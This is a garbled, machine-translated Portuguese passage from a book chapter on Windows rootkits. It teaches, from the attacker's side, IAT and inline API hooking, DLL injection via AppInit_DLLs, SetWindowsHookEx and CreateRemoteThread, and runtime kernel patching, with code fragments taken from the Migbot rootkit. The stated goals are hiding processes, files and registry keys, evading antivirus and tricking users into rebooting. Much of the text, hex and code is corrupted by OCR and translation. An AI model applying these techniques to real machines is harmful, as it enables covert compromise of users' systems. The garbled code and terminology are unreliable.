"Spora" e transfere para o programa desafiador.Vamos, por exemplo, 
A função inicial retornou a lista de arquivos neste catálogo.Então 
Nossa função verificará se há arquivos nesta lista que coletamos
Vamos nos esconder e, se houver, os removerá da lista e devolverá o modificado 
Liste como resultado. 
A substituição dos dados de origem é realizada de maneira diferente: intercepamos o desafio 
API funciona 
função e continue sua implementação. 
De que maneira é mais confiável, o que é mais fácil, não vou dizer: você deveria 
Sinta -se.Minha pequena coisa é dizer como perceber 
Ambos os métodos. 
Primeiro sobre como visualizar o conteúdo da biblioteca.Você tem 
Comando total?Caso contrário, instale -o.Ele pode posteriormente 
Você é útil.Você já o instalou?Então vá para o catálogo 
<i windir> \ system32 e aberto para visualizar ("f3") biblioteca 
Kernel32.dll.Vá para a guia Cabeçalho do arquivo de imagem.Aqui em
Há informações exaustivas sobre a biblioteca.Doce 
até o cabeçalho da tabela de exportações.Esta é uma tabela de exportação, nele 
Todas as funções exportadas pela biblioteca são indicadas e o ponto de entrada 
cada função. 
Coloque a tabela de exportação até encontrar a função FindFireStFile. 
Esta função serve para produzir o conteúdo do catálogo.Primeira coisa 
O aplicativo causa.Se o catálogo existir e não estiver vazio, então encontre o arquivo 
Retorna o descritor, que é usado em subsequente
Whh fine findnextfile (também exportado do kernel32.dll). 
Cada chamada FindNextFile retorna um arquivo do catálogo.Geralmente 
FindNextFile é chamado no ciclo até depois
Arquivo de gelo. 
Para usar essas funções, o aplicativo durante a execução
Nenia envia a biblioteca kernel32.dll e copia os endereços de importação
As funções caíram para o seu endereço de endereços (IAT, importar 
Tabela de endereço).Quando o aplicativo causa uma das funções da API, os gerentes
O cílio é transmitido ao endereço indicado no IAT após a conclusão da função 
A execução do programa continua com as instruções seguintes na chamada
Função de WOM. 
64

pagina: 64

Capítulo 3. Crazy como um estilo de vida de Rutkita
1º L “ter (meigo) - k \ wi No. 0W5 \” YSTEM3^K “RTE*”
Fiep
Qpaeka
Btju
Ajuda
Propriedades da FTE.Dependência do trabalho
Tabela de exportações.
NOME
Characteitslics.
Tmedateslamp:
VEUZE:
Base ordinal:
8 de Tuntbnr
Tt de nomes:
Entrada P!
000137681h
00O33f £ h
0OOD496H
D00607C5H
00oso78 £ h
Oofmeoaih
0004DF8CH
00035030b
000?
00036 "" "
Oookoceh
O00ODF51H
0000261AH
Ooooooocceh
0004C126H
0004b2olH
0004C709H
0001F6A3H
00058f £ ln
00O5S5EP
h " -"
Cabeçalho do arquivo Fringe J Opções |Aboul |
Kernel32.dli
Uooooooch
3d6de616h-> 29ly/2002 12:15:02
você
O
0
00000001H
Ooooooozdeg,
OU0003AEH
Qfdn
Nome*
1
ActiveLeAcctm
2
M & Aona
3
Addatorrrw
4
AddCOROTOAFATA
5
AddConsoleafcuw
6
Ava.
7
Addlocafa!
S.
AddRefaclclx
9
Addveclaec^kceptionHandlei (fofw-aidei
10
Ahococnsole
onze
AflocateUserftiysicalPages
12
A/efiieapisansi
13
Como^ipiocesstojobobrct
14
AtlachComcle
15
Sackupread
16
8ckups*ek
17
Backupwiite
13
Ba.wchectappci.'mipalcai^be
19
BaseeAntiPappCompaacrie
20
Basstleanup^pptompatcacheoPofr
'.: ' EU
Joel
*EU
> Ntdll.rlwddwectoredExcationharkjiei
-
J.
> <*
Arroz.Z.1.Tabela de exportação da biblioteca Kernel32.dll
Por sua vez, a função FindNextfi le aborda a biblioteca NTDLL.D ll.
A biblioteca ntdll carrega a função do análogo FindNextfi 1 e na EAC,
Trabalhando no nível do núcleo (esta é a função YFILE RECTOR NTQUERYDI) e em EDX
- Os parâmetros transmitidos pelo FindNextFile.Então NTDLL causa uma interrupção
Int 0x2 E para mudar para o modo núcleo.
FindNext Call Chain
Arquivo kernel32.dll -»ntque-
Gudirectory -> int 2e ->
KisystemService -> ntque-
Rydirectory (Fig. 3.2)
isto
por falar nisso
execução
funções.
Desde o usuário
O aplicativo carrega Ker-
Nel32.dll em si
espaço de endereço (endereços
Memória entre 0x00010000
e 0x7ffe0000), nossas rotinas
O kit pode facilmente acabar
Escreva qualquer função em
Kernel32.dll ou mesmo
Aplicativo do usuário
Chamadas FindNextFile
FindNextFile
[Kernel32.dll]
NtQueryDirectorvFile
rntdlt.dll]
Int 2e (ou sistema)
1
1
KisystemService
>
NtQueryDirectoryfiie
[rrtoskjnl.exe]
Masin
yur
Vatelsk!
Benefícios
A
O.
NYA
Minov
Arroz.3.2.FindNextFile Função
3 Zak 665
65

pagina: 65

Rootkits 
Tabela IAT.Este processo é chamado de interceptação de API (em inglês -que fala 
Literatura - API enganche). 
3.2.1.Relnando o endereço da função 
A maneira mais fácil de reescrever o processo de importações de processo (IAT).Todo mundo tem 
Os aplicativos são a estrutura de image_import_descriptor contendo 
Nomes de DLL, cujas funções são importadas pelo aplicativo, bem como duas 
Indicadores para duas matrizes de estruturas image_import_by_name.Estrutura 
Image_import_by_name contém os nomes das funções importadas 
aplicativo. 
Ao carregar o aplicativo na memória, o sistema operacional analisa 
Image_Import_Descriptor Structure and Download os aplicativos necessários
a biblioteca.Assim que as bibliotecas são carregadas, sistemas operacionais
O tópico modifica image_import_by_name matrizes, escrevendo neles 
Endereços reais das funções exigidas pelo aplicativo. 
Deixe a versão Rutkin da função está no espaço de endereço do aplicativo
Zhenya (como ela chega lá se dedica à cláusula 3.3).Então Rutkin não é nada 
Não reescreva a tabela IAT substituindo o endereço da função inicial da API 
o endereço de sua própria função. 
Mudar as tabelas do IAT é muito poderoso, mas ao mesmo tempo simples
Nika.Sua principal vantagem é a simplicidade da realização.Além do mais 
Esta técnica é descrita em grande detalhe, inclusive na documentação da API, 
Afinal, este é um procedimento completamente legal usado pela própria operação
sistema onna.Na documentação da API, é chamado de DLL-Forwarding.A 
Existe apenas uma desvantagem desse método: a interceptação da API é relativamente fácil 
É detectado por antivírus e medicamentos anti -reguladores. 
Infelizmente, esse método não é aplicável a todos os aplicativos.Alguns 
deles não preenche a mesa do IAT durante o lançamento, porque
Os endereços das funções importadas sob demanda, causando carga de carga 
E getProcaddress.Essas aplicações não usam IAT, ou seja, 
Seu rootkit não funcionará.Nesses casos, uma técnica mais complexa ajudará 
- cruzando o código de uma função já carregada na memória. 
3.2.2.Reling a própria função 
Agora não importa como o aplicativo recebeu o endereço da função da API com a qual 
Vamos "jogar" - da tabela do IAT ou ligar para GetProcaddress. 
66

pagina: 66

Capítulo 3. Crazy como um estilo de vida de Rutkita 
Afinal, substituiremos não o endereço, mas diretamente bytes do código -fonte 
funções. 
O algoritmo geral se parece com o seguinte: 
1. Rutkit mantém a primeira parte traseira da função inicial - estes 
Baytes agora será substituído. 
2. Então Rutkin escreve para o local dos primeiros bytes uma equipe de incondicional
A transição JMP é?Obviamente, para a função de troca. 
3. Depois de executar o código Rutkin, são realizados bytes salvos 
funções e a função inicial são causadas (ou seja, outro imposto
TROCAÇÃO JMP, mas na função inicial).A função inicial de quem
Ele gira o resultado, mas não o programa principal, mas para Rutkin. 
4. Rutkin modifica o resultado e transfere o gerenciamento do principal 
programa. 
Quantos bytes da função original podem ser reescritos?Comando
Sim, cinco bytes ocupam a transição incondicional.A maneira mais fácil de reescrever 
São os cinco primeiros bytes da função original.Primeiro, os primeiros bytes, 
O preâmbulo chamado é o mesmo para todas as funções da API Win32.Eles 
todo mundo sabe, então eles nem podem ser preservados, o que é significativamente 
Simplifica o esquema de reescrita: em vez de uma transição incondicional para salvar 
As instruções podem ser simplesmente tomadas e executadas. 
É necessário apenas levar em consideração o fato de que as funções de preâmbulo são diferentes para 
Várias versões do Windows.Se a versão do Windows for mais jovem que o XR SP2, então 
O preâmbulo se parece com o seguinte: 
Instruções de montador 
Empurre EBP 
Mov ebp, 
Esp 
Sixt -core Performance 
55 
8BEC 
Se o Windows XP SP2 estiver instalado ou posterior, então o Pream
Bula parece diferente: 
Instruções de montador 
mov e d i, 
E d i 
Empurre EBP 
Mov ebp, 
Esp 
Sixt -core Performance 
8 b f f f f 
55 
8BEC 
Observe que no Windows XP SP1, o Prémbula leva apenas 3 bytes 
(55 8 ela).Acontece que o preâmbulo e dois bytes terão que ser reescritos 
67

pagina: 67

Rootkits 
Algumas outras instruções.Isso deve ser levado em consideração: sua função, execução
Reescrita de nichos, deve ser capaz de realizar Dizassembri
o início da função e determine o comprimento das instruções. 
No Windows XP SP2, nosso trabalho é bastante simplificado.Bore de pré -Dotbula
São 5 bytes - tanto quanto necessário.Ele foi ajudado por si mesma neste 
Corporação Microsoft.A Microsoft realmente não forneceu a que finalidade 
Isso pode ser usado?Exatamente o oposto: é para esses propósitos que ela 
Isso foi feito.Uma nova função de "Hot Patch" apareceu no SP2, eu permito
o que é inserir um novo código sem reiniciar o sistema.Não fizemos nada 
Ilegal, apenas aproveitou a nova oportunidade da Microsoft. 
Agora vamos falar sobre a segunda razão para a reescrita dos primeiros bytes de diversão
Keniya.Na verdade, não há nada para falar.Eu acho que isso já está claro.Imagine
Aqueles que você colocou uma transição incondicional para o meio da função.Depois, 
Quando você precisa iniciar a função inicial, seu código de função 
Significativamente complicado: afinal, você precisará executar o código da fonte 
funciona para uma transição incondicional, executa bytes substituídos e 
Transfira o controle da parte restante da função.Um erro em um semelhante 
O processo pode levar a resultados imprevisíveis.Conclusão: Sala
Uma transição incondicional para o início de uma função é ideal e 
a solução mais simples. 
Agora um pouco de terminologia.Bytes do código que você reescreveu 
e que você precisa salvar em algum lugar e depois cumprir, são chamados 
Springboard.A transição incondicional que você coloca na libra alvo
Kion é chamado Bypass.Esquema de substituição de função ignorando e 
O trampolim é mostrado na FIG.3.3. 
A função inicial é a função do aplicativo do usuário, as chamadas
uma função de API direcionada.Olhando para o desenho, tudo fica em seu 
Locais: a função inicial causa direcionada, mas desde que colocamos em 
Seu começo "Bypass", mudamos para a função do desvio. 
Esta função executa algumas ações e transfere gerenciamento 
Polvilhe funções.Sua principal tarefa é preparar um trampolim, isto é, 
executar a sequência de instruções que estavam reescrevendo
No desvio.Depois disso, a função do comerciante transfere o controle do alvo 
funções que retornam o resultado de uma função de desvio.Último modi
Se encaixa no resultado (se necessário) e o envia para a função inicial. 
Informações adicionais sobre como alterar o caminho de execução e outros MO
Você pode encontrar no artigo “Windows 
Sob a visão ”publicada no site http: / / www.SecurityLab.ru. 
68

pagina: 68

Capítulo 3. Crazy como um estilo de vida de Rutkita 
A função inicial 
. 
1 
Função do abdômen 
EU. 
• EU 
Função 
Springboard 
EU 
Função alvo 
Arroz.3.3.Função relativa na memória 
3.3.A introdução do código Rutkit no processo de outra pessoa 
Agora o mais interessante começa.Vamos considerar como você pode 
Coloque seu código raiz no espaço de endereço de outro processo. 
O nome geral do método descrito é DLL.Ele consiste em 
Que adicionamos nossa DLL a outro processo.Então, apresente nosso 
A DLL pode ser de três maneiras: 
• 
Usando a tecla Appinit_dlls, o Windows Registry; 
• 
pela interceptação das mensagens do Windows; 
• 
Com a ajuda de fluxos remotos. 
3.3.1.Chave appinitjdlls 
Esta é a maneira mais fácil de trabalhar no Windows NT/2000/XP/2003. 
Consiste no seguinte: Rutkin deve ser prescrito no HKLM \ 
Software \ Microsoft \ Windowsnt \ CurrentVersion \ Windows \ Ap-
Pinit_dlls (Fig. 3.4) própria biblioteca, que seria reescrita
Val Table IAT.Ao iniciar um aplicativo usando a biblioteca 
User32.dll, carregando a biblioteca indicada nesta veia neste 
Espaço de endereço do aplicativo.O carregamento da DLL é realizado pelo próprio babador
Pequenos pólos user32.dll.Vale a pena notar que é oficial e bom 
Método documentado. 
Como pode ser visto na figura, a biblioteca é "registrada" no appinit_dlls 
Brandmauer Outpost Firewall Pro.Novamente, não violamos nada, mas use
Vemos os recursos do Windows. 
A propósito, se já existe algum tipo de biblioteca nessa linha, através de uma vírgula você 
Você pode indicar o seu.A biblioteca User32.dll carrega toda a DLL,
numérico na chave Applnit_dlls, no espaço de endereço do processo.POS
Carregar cada DLL é chamada de função dllmain com um parâmetro, 
através da qual a causa da função é transmitida.Este parâmetro pode 
69

pagina: 69

Rootkits 
aceitar um dos quatro valores em que só estamos interessados 
Dll_process_attach, indicando que a DLL está conectada ao processo. 
Assim que sua DLL se juntar ao processo, nada custa uma referência
prever as funções causadas pelo processo, o que permitirá que você se esconda facilmente
Processo, arquivos, chaves de registro e conexões de rede. 
Sh 
Editor de registro 
Arquivo Cedak §p & Hazel **** 0*Ajuda 
F o rl* 
_d 
;+] C J Profilelist 
N £ e relacionado.desc 
G+LCJ Secedit 
:+;Eu l J Setup 
||'! 
S W SVCHOST 
;+'P "L SystemRestore 
1
+
] C J Servidor de Terminal 
W (_J de zonas do tipo 
S.
3 rastreamento de CJ 
I*rcj tipo 1 instsador 
CJ UserInstilable.Drivers 
: • ^ 3 Windows 
1 
Eu cj wirjogon 
$ • £ J Uau 
G 
Wpaevents 
(T'ej windows script host 
1 
M C3 Windows Script Host 
Shh w2csvc 
J. 
Nome 
£ £] (por padrão) 
^Yoeyozy! 
I^j DeveceNotSelecte, 
I^JGOIPROTESSHAN! 
Qspoler 
Iisjswapdisk 
^TransmissionRetR. 
^] U5 £ rprocesshan ,, 
<I. 
Jfto i "> mrfc No.tep \ hkeyjlocal 
Jiach^ 
: 
'
-
h
.
;
-
:
. 
• 
. 
• 
Tipo 
R
E.
G sz 
Reg.sz 
.Reg.sz 
Reg.dworo 
Reg_sz 
Reg_sz 
Reg_sz 
Regj3word 
Eraon \ 
janelas 
Jofij 
Eu significando 
(O valor do IE é atribuído) 
E: \ pr0gr4 ~ uagr <t'jm \ outp05 ~ l \ wl_hook.dll 
15 
0x00002710 (10000) 
Sim 
90 
0x00002710 (10000) 
1 
E 
Arroz.3.4.Chave APPLNIT_DLLS 
No entanto, esse método tem uma pequena desvantagem: o valor da chave 
Appinit_dlls não se aplica a todos os processos, mas apenas naqueles que 
foram lançados após sua tarefa. 
Deixe nosso rootkit, projetado para esconder certas chaves de re
Estra, prescreveu com segurança sua DLL na chave Appinit_dlls, mas benefício
Vatel conseguiu abrir o editor de registro antes.Então regedit, como nada 
Isso não aconteceu, continuará exibindo todas as chaves do registro.Depois de reiniciar 
Esta desvantagem desaparece.Portanto, após a instalação da rotina 
Você precisa pedir ao usuário para reiniciar sob qualquer pretexto 
computador. 
3.3.2.Interceptação do Windows 
Todo o Windows Work é baseado em eventos e mensagens (mensagens). 
Um evento é qualquer ação relacionada ao aplicativo.Por exemplo, em
Desculpe pela tecla do usuário no teclado - houve um evento de pressionamento 
As chaves, arrastaram a janela - um evento do movimento da janela surgiu, etc. 
O Windows monitora os eventos e os relata para aplicativos usando 
mensagens.O programador ao desenvolver seu aplicativo determina 
70

pagina: 70

Capítulo 3. Crazy como um estilo de vida de Rutkita 
Manipuladores de eventos - funções que serão executadas
Quando este ou esse evento ocorre. 
A Microsoft forneceu gentilmente uma função que permite
Mensagens reais de outro processo - setWindowshookex (novamente 
Aproveitamos a API do Windows!).Com esta função, podemos 
Faça o download de nossa DLL no espaço de endereço do processo.A função deve 
Ligue para o Rutkin Bootloader ou um aplicativo separado usado para 
Injeções de DLL. 
O protótipo da função setWindwshookex se parece com o seguinte: 
Nnook 
S e t w i n d o o o o k e x) 
I n t 
Eu d h o k, 
Hookproc 
l p f n, 
Hinstance Hmod, 
Dword d w t h r e d l d); 
O primeiro parâmetro define o tipo de armadilha, por exemplo, wh_keyboard.Armadilha 
Digite WH_KEYBOARD permite interceptar as mensagens do teclado. 
Outras armadilhas permitidas são fornecidas na tabela.3.1. 
Tabela 3.1.Faixas de mensagens 
Armadilha 
WH_CALLWNDPROC 
WH_CALLWNDPROCRET 
Wh_debug 
Wh_getMessage 
Wh_journalplayback 
Wh_journalredcord 
Wh_keyboard 
Wh_mouse 
Descrição 
Permite que você instale uma armadilha 
(função 
interceptação), visualizando mensagens para 
Procedimento de janela (consulte o certificado API-FUN
CallWndProc 
Como WH CallWndProc, mas interceptar
Mensagens SY que já foram processadas Windows
Procedimento de Noah 
Usado na depuração de outras armadilhas 
Usado para interceptar todas as mensagens, 
Coloque na fila 
Intercessão 
mensagens, 
qual 
eram 
pré -gravado pelo procedimento
grabb w
H JournalRedcord 
Intercepta todas as mensagens gravadas no SIS
Linha escura 
Permite que você controla a chave
Atura 
Permite controlar as mensagens do mouse 
71

pagina: 71

Rootkits 
Wh_msgfilter 
C.
H sysmsgfilter 
Usado para interceptar mensagens, gene
apressado com janelas de diálogo (caixa de diálogo), 
Windows de informações (caixa de mensagem), 
Menu e tiras de rolagem (barra de rolagem) 
Permite que você intercepte mensagens que 
surgem como resultado de entrar em diálogo 
Janela, janela de informação, menu e tira 
Rolando 
O segundo parâmetro (LPF P) é o endereço da função dignosa, ou seja, as funções, 
responsável pela interceptação.Se o parâmetro dwthReRedid for 0 ou indicar 
No fluxo criado por outro processo, o parâmetro lpf n deve decretar
Tome uma função no DLL.Caso contrário, LPF N deve indicar 
Uma função relacionada ao processo atual. 
O terceiro parâmetro (HMOD) indica a DLL, que contém o código
Knium-Lovushki.Esta é a nossa DLL, que será introduzida no endereço 
O espaço do processo.Hmod pode ser nulo se o parâmetro 
DwthreadId define o fluxo criado pelo processo atual e se
A armadilha está localizada dentro do código associado ao processo atual. 
O último parâmetro define o identificador de fluxo (este é o identificador 
o processo que precisa ser "ouvido") com o qual a função está associada 
armadilhas.Se o dwthreadId for 0, então a função da armadilha ouve tudo 
Fluxos. 
Por exemplo, se o carregador de inicialização Rutkit causou uma função: 
SetWindowshookex 
(Wh_mouse, mousehook, dundle, 
0); 
Então, quando ocorrer qualquer evento do mouse, a função será causada 
MouseHook da biblioteca Duhandle. 
E o que é Rutkutka em si?Vamos escrever o modelo dela contendo 
Função Divum (Listagem 3.1). 
Listagem 3.1, 
Bool 
Apiente 
Dllmain (alça 
Hmodule, 
DWORD 
Razão, 
Lpvoid 
LPreserved) 
EU 
se (razão 
Processo DLL Anexar) 
{ 
// O código deste bloco será inserido no espaço de endereço 
// process-victims 
72

pagina: 72

Capítulo 3. Crazy como um estilo de vida de Rutkita 
} 
Retornar true; 
) 
DeclSpec (Dllexport) LRESULT MouseHook (Intsode, 
Wparam wparam, lparam 1param) 
{ 
// idealmente, nosso rutkit deve causar a próxima armadilha 
// e transfira para ela os parâmetros correspondentes 
Retornar callnexthoookex (gancho, código, wparam, lparam); 
} 
Como você pode ver, ao desenvolver armadilhas no nível do usuário, não fazemos
Não usou erros no Windows, nem funções não documentadas. 
Acabamos de usar a API do Windows.Eu acho que está certo, porque 
O erro pode ser corrigido e o método não documentado está fechado.COM 
O uso da API escreveu centenas de milhares de aplicações e bloqueio 
Pelo menos uma função da API pode implicar uma recusa de significativa 
Seus números. 
3.3.3.Fluxos remotos 
O próximo método de introduzir nossa DLL no espaço de endereço 
O processo é o uso de fluxos remotos.A ideia é
Blowing: Rutkita Bootloader cria um fluxo remoto, conectando -se a já 
processo lançado, no espaço de endereço, cujo será carregado 
DLL de nossa Rutkita. 
Para criar um fluxo remoto, uma chamada do sistema é usada 
CreateremotThread: 
Manuseie o createremotThread (manuseio h p r o s, 
Lpsecurity_attributes l p t h r e d t t r i b u t e s 
Siejt dwstacksize, 
Lthread_start_rautine i p s t a r t a d d r e s, 
Lpvoid lpparameter, 
D.
C.
O
R
D dwcreationflags, 
Lpdword lpthreadld 
); 
O primeiro parâmetro é o descritor do processo em que você precisa apresentar 
fluxo.Para obter um descritor, o Rutkita Bootloader deve ligar 
Função do OpenProcess que permite se conectar a um processo aberto
Su.Aqui está o protótipo dela: 
Lidar 
Bool Blnhherithandle, 
DWORD DWProcessID 
); 
73

pagina: 73

Rootkits 
Para ingressar no processo, você precisa conhecer seu PID (identificador de processo). 
O processo do processo também pode ser encontrado programaticamente usando a API. 
Retornando à função CreateremotThread, parâmetros LPTHRead
A t t r i b u t e s e ipthreadID precisam ser instalados em nulo, e dwstacksize e 
DwcreationFlags - em 0. 
O valor do parâmetro ipstartartAddress deve ser a função da função 
Processo de Biblioteca de Cargas.Daqui está claro que, dessa maneira, eu tenho
você pode apenas no aplicativo usando kernel32.dll, 
Que exporta carga de carga.Você pode obter o endereço de carga 
Usando a função getProcaddress: 
GetProcaddress (getModuleHandle (Text ("Kernel32")), "Loadlibrya"); 
O parâmetro Lpparameter é uma linha transmitida pela LoadLibrary.Mas 
O Rutkit Bootloader não pode simplesmente transferir o endereço da linha, pois este 
A linha está em seu espaço de endereço, e é necessário que caia em 
Espaço de endereço da vítima.Segure este obstáculo permitir
Duas chamadas de sistema: VirtualalleCex e WriteProcessMemory. 
Usando o VirtUalllocex, o Rutkit Bootloader pode distribuir 
Memória no processo de destino: 
Lpvoid v i r t u a l a l l o c s ( 
Manuseio h p r c s, 
Lpvoid lpaddress, 
Size_t dwSize, 
D.
C.
O
R
D FlallocationType, 
D.
C.
O
R
D flprotect 
); 
Para gravar o nome Dll Rutkita, uma chamada é usada para ligar, 
quem precisa transferir o endereço que você receberá da chamada de Virtual
Allocec. 
Prototype WriteProcessMemory: 
Bool WriteProcessMome ( 
Manuseio h p r c s, 
Lpvoid lpbaseAddress, 
Lpcvoid l p b u f f e r, 
Size_t n s i z e, 
Size_t* lpNumberOfbytesWritten 
); 
3.4.Patching "carga" 
Os métodos considerados no parágrafo anterior são inegavelmente muito poderosos
NYE, mas eles são velhos como um mundo, portanto, são facilmente determinados por anti -reguladores 
74

pagina: 74

Capítulo 3. Crazy como um estilo de vida de Rutkita 
significa.Às vezes, um método mais eficaz é o patch do tempo
não a execução, isto é, a imposição de um patch está "em tempo real", sem a conclusão de
gramas.Time Patch também não é uma nova tecnologia, mas na época
é usado raramente, o que permite enraizar 
permanecer despercebido por antivírus, anti -regulamentação e até mesmo 
Programas de exame forense. 
Para o desenvolvedor Rutkita, o patch é um dos mais avançados 
tecnologia, armada com a qual você pode criar incerto 
Até os mais novos sistemas IPS de Rutkin. 
Já examinamos a semelhança do patch "On the Fly" na cláusula 3.2.2, mas então estamos
Usou essa técnica para atingir um objetivo completamente diferente.agora nós 
Não interceptaremos as funções da API, mas simplesmente substituiremos alguns bytes em IP
A função de caminhada - "arou", escrevendo em vez de bytes originais 
Transição para a função de Rutkin.Circuito "desvio", ou mudanças no fluxo de unidades
Remopela de fluxo de controle, mostrado na Fig. 3.5. 
> s 
eu 
X 
h 
O 
X 
E 
5 
Operador 1 
1 
Operador 2 
1 
1 
JMP rootkit 
Operador n + 1 
1 
1 
Resultado de retorno 
-EU 
Operador 1 
1 
Operador 2 
1 
1 
_Jmp 
Código Rutkin 
Arroz.3.5.Esquema "círculo" 
Rutkin em vez de o operador n insere uma transição incondicional para seu código, para
que executa a ação necessária para Rutkin e depois retorna o gerenciamento 
a função inicial, não apenas para o operador n + 1, mas para o operador retornando 
resultado.É fácil adivinhar que, no processo de execução, o código Rutkit 
Modificado esse mesmo resultado. 
Primeiro de tudo, você precisa encontrar o endereço da função na memória, o que é mais fácil
Luz se a função for importada.Depois disso, você precisa determinar onde 
É colocar nosso JMP.Na cláusula 3.2.2.o capítulo que colocamos no começo 
75

pagina: 75

Rootkits 
Funções, mas então a tarefa foi diferente.Agora precisamos de uma função 
Ela própria concluiu algumas ações e depois mudou apenas para o código de Rutkin. 
Para fazer isso, precisamos "desmontar" a função nos ossos para entender 
O que exatamente ela faz, e com base nisso, escolha o melhor lugar para 
As entradas do CJMP "Springboard" em nossa função).Ao mesmo tempo, você precisa levar em consideração 
que o "trampolim" pega 7 bytes.É claro que algumas instruções 
A função inicial pode precisar ser preservada.Sem isso, de jeito nenhum.Todos 
O problema é que instruções diferentes têm um comprimento diferente.Push pode ocupar 
1 byte, um JMP - 7 bytes.Então tente espremer J MP. 
É improvável que você consiga encontrar uma, duas ou três instruções para que seu general 
O comprimento era exatamente 7 bytes.Na maioria das vezes você terá um ou dois 
byte extra (Fig. 3.6, a). 
1 
OR1 
2 
\ 
; 
1.4 ' 
OU: 
5 
Orz 
6 
FAR JMP meu rootkit_code 
1 1 1 
OP4 
1 
S. 
9 1 
Ops 
1 
2 
.
1 &:-"| -g-; 
1:-::;* “1 a 
L. 7 
FAR JMP MV ROOKET Código 
8 
??? 
9 
Ops 
1 
* "•! 
3 
| 
4 
| 
5 
| 
6 
FAR JMP my_rootldt_code 
'• EU 
S. 
1 NOP 
9 
Ops 
Arroz.3.6.Substituição 
instruções 
Na fig.3.6 no topo mostra que na memória estão localizados sequencialmente
Tructions ou1 - ou5 com um comprimento de 1, 3, 1, 3 e 1 byte, respectivamente.Por esta
Então você precisa entrar na equipe da longa transição, que ocupa 7 bytes; 
Ela substituirá as instruções OR1 - OR4.O resultado da substituição é mostrado 
Na fig.3.6, b. 
O último byte das instruções do OR4 será percebido pelo processador como um traço
uma equipe, cujos resultados podem ser imprevisíveis até 
Para a tela azul da morte.Para que isso não aconteça, em seu lugar você precisa
Escreva o comando vazio NOP (0x90), que apenas ocupa um byte. 
Se os bytes "extras" permanecerem 2-3, as instruções NOP precisam ser registradas 
no lugar de cada um deles.A substituição correta é mostrada na Fig. 3.6 (c). 
3.4.1.É uma função? 
Antes de reescrever, você precisa ter certeza de que está mudando exatamente essa função 
(ou exatamente aqueles bytes) que você precisa (que você precisa).Nome 
funções para isso não são suficientes, porque o código da mesma função pode 
76

pagina: 76

Capítulo 3. Crazy como um estilo de vida de Rutkita 
Seja completamente diferente para diferentes versões do Windows.Por exemplo, funções 
As versões domésticas do Windows XP têm os mesmos nomes da versão Pro, mas 
Como a versão pro suporta SMP, o código de algumas funções pode 
diferir.Talvez a situação seja ainda mais fácil: o usuário instalado 
Service Pack 2 para Windows XP Pro, que mudou algumas funções. 
Não vamos inventar a bicicleta, mas considere como ela verifica o código
Encontrado em patching possivelmente uma raiz pronta que usa o método 
Patching on the Fly - Migbot.Você pode baixá -lo no site Greg Hogond, 
Guru bem conhecido no estudo do Rutkitte, em H t p: / / / / / / / / / / / / / 
www.r o t k i t.COM/VAULT/HOGLUND/MIGBOT.Fecho eclair.Fragmentos do código são tomados 
Do arquivo MIGSYS.Com. 
MIGBOT altera o fluxo de controle para o arquivo de iocontrol ntdevice 
e SeacessCheck.Para a primeira função, o comprimento do seguidor substituído
Byes of Bytes é 8 bytes, para o segundo - 9. Listagem 3.2 mostra o código 
As funções que verificam se esses bytes coincidem no ambiente atual com a amostra. 
Listagem 3.2.Verifique se as funções necessárias estão sujeitas ao patch. 
Ntstatus checkfunctionBytesntevicelocontrolfile () 
{ 
int i = 0; 
Char *p = (char *) ntdevicelocontrolfile; 
// função ntdevicelocontrolfile deve 
// Comece com bytes: 
// 55 
Empurre EBP 
// 8BEC 
Mov 
EBP, esp 
// 6A01 
Empurre 01 
// FF752C 
Push DWORD PTR [EBP + 2C] 
// Se a função começa com bytes especificados, então é isso, 
// que precisamos 
Char c [] = {0x55, 0x8V, Okue, Ohba, 0x01, Oxff, 0x75, 0x2s}; 
Enquanto 
(I <8) 
{ 
Dbgprint (" - 0x%02x", (char não assinado) p [i]); 
if (p [i]! = c [i]) 
{ 
Retornar statusjjjnsucessful; 
) 
I ++; 
} 
Retornar status_success; 
} 
Ntstatus checkFunctionByTesseAccessCheck () 
77

pagina: 77

Rootkits 
int i = 0; 
Char *p = (char *) SEACESSCHECK; 
// O início da função SeaccessCheck: 
// 55 
Empurre EBP 
// 8bec mov 
EBP, esp 
// 53 
Empurre EBX 
// 33dB xor ebx, ebx 
// 385d24 cmp [EBP+24J, BL 
Char c [] = {0x55, 0x8b, oxec, 0x53, 0x33, oxdb, 0x38, 0x5d, 
0x24 
Enquanto 
(I <9) 
{ 
Dbgprint 
Eu f (p [i] 
! 
- 0x%02x ", (char não assinado) p [i] 
C [i]) 
Retornar status_unsucessful; 
} 
I + +; 
} 
r e t u r n statatus sucesso; 
Neste exemplo, tudo é simples: as funções que precisam ser corrigidas e 
As equipes com as quais começam.Quando você escreve o seu próprio 
rutkit, para procurar uma vítima e o lugar certo
Trabalhe como depurador.Você pode usar o softlce ou outro depurador 
nível do núcleo.Eu recomendo softlce, inclusive porque na internet 
Você pode encontrar muitos manuais em russo.Neste livro nós 
Não vamos considerar isso. 
Assim que você reescrever instruções originais, eles para sempre
existirá.Portanto, você precisa cuidar de sua preservação.EM 
Exemplo, como sabemos que tipo de instruções é essa, é suficiente para inserir 
Eles estão diretamente no código das funções de desvio (Listagem 3.3).Vamos mostrar simplesmente 
Os plugues que executam apenas comandos substituíram. 
Listagem 3.3.Função salarial 
_Declspec (nu) my_function_detour_ntdeviceiocontrolfile () 
// Nós realizamos as instruções substituídas 
Empurrar 
EBP 
78

pagina: 78

Capítulo 
3. Diversão como 
imagem 
A vida de Rutkin 
mov 
EBP, esp 
Empurrar 
0x01 
Empurrar 
DWORD PTR [EBP+0x2C] 
// atravessa o endereço especificado (retornamos) 
// O endereço é inválido, ele precisará ser substituído 
// manualmente quando 
// Vamos calculá -lo, mas isso já está durante a execução 
// JMP FAR 0X08: 0XAAAAAAA 
_emit oxea 
_emit OXAA 
_emit OXAA 
_emit OXAA 
_emit OXAA 
_emit 0x08 
_emit 0x00 
} 
} 
DeclSpec (nu) my_function_detour_seaccesscheck () 
{ 
ASM 
{ 
// Nós realizamos as instruções substituídas 
Empurre EBP 
mov 
EBP, esp 
Empurrar 
EBX 
xor 
EBX, EBX 
Cmp 
[EBP+24], BL 
// atravessa o endereço especificado (retornamos) 
// O endereço é inválido, ele precisará ser substituído 
// manualmente quando 
// Vamos calculá -lo, mas isso já está durante a execução 
// JMP FAR 0X08: 0XAAAAAAA 
_emit oxea 
_emit OXAA 
_emit OXAA 
_emit OXAA 
_emit OXAA 
_emit 0x08 
Emiti 0x00 
Temos duas funções que executam instruções ausentes, mas quando 
Chame-os?Para fazer isso, você precisa desenvolver um esquema de desvio.Clássico 
O esquema é mostrado na FIG.3.7. 
79

pagina: 79

Rootkits 
= t 
O 
X 
= t 
X 
O 
S. 
JMP rootkit 
